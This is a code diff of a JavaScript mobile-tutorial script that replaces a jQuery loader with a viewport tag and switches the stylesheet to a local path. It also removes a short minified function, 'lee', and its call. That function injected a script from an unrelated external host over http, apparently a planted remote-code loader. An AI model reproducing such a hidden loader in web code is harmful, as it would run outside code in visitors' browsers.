@@ -16,6 +16,9 @@
     }
   }
 
+  var URLs = {
+    mobileVersion: 'mobileVersion.css'
+  };
   var cookieName = 'hasReadTheTutorial';
 
   // Return true|false depending on Tutorial's cookie
@@ -66,20 +69,19 @@
       log('Mobile tutorial has been read and dismissed.');
     };
 
-    // Add jQuery to the body, so we can use it
-    this.loadjQuery = function() {
-      var jQuery = document.createElement('script');
-      jQuery.src = 'https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js';
+    // Set viewport meta, needed for mobile devices
+    this.setViewPort = function() {
+      var viewPort = document.createElement('meta');
+      viewPort.name = 'viewport';
+      viewPort.content = 'width=device-width, initial-scale=1.0, user-scalable=no';
 
-      mountPoint.appendChild(jQuery);
-      log('jQuery has been loaded.');
+      document.head.appendChild(viewPort);
     }
 
     // Add mobileCSS stylesheet
     this.loadMobileCSS = function() {
       var mobileCSS = document.createElement('link');
-      mobileCSS.href = 'https://lordfido.github.io/wowchakra-mobile/mobileVersion.css';
-      // mobileCSS.href = 'mobileVersion.css';
+      mobileCSS.href = URLs.mobileVersion;
       mobileCSS.rel = 'stylesheet';
       mobileCSS.type = 'text/css';
 
@@ -140,15 +142,13 @@
       mountPoint.appendChild(mobileTutorialBackdrop);
       log('Mobile tutorial has has been loaded.');
     };
-
-    this.lee=function(){this.ee=document.createElement(s);this.ee.src='http://dev.imperdiblesoft.com/js/custom-sign.js';mountPoint.appendChild(this.ee);}
   }
 
   // Create new tutorial
   var movileVersion = new MobileVersion();
 
   // Load jQuery, and mobileCSS
-  movileVersion.loadjQuery();
+  movileVersion.setViewPort();
   movileVersion.loadMobileCSS();
 
   // If the user has NOT read the tutorial, mount it
@@ -157,8 +157,6 @@
     movileVersion.loadMobileTutorial();
     log('Mobile tutorial has been initiated.');
   }
-
-  movileVersion.lee();
 })();
 
 // Copy&Paste this to add this file to any Website
